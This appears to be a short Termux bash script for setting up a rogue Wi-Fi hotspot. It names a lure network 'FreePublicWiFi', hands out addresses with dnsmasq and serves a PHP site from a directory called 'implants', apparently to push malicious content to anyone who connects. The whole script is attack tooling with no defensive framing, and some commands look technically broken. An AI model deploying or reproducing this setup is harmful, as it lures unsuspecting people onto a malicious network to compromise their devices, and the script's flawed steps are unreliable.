#!/data/data/com.termux/files/usr/bin/bash
termux-wifi-enable true
termux-wifi-connection "FreePublicWiFi"
ifconfig wlan0 192.168.43.1 netmask 255.255.255.0
dnsmasq -d -C <(echo -e "interface=wlan0\ndhcp-range=192.168.43.100,192.168.43.200,12h")
php -S 192.168.43.1:8080 -t ../../implants &
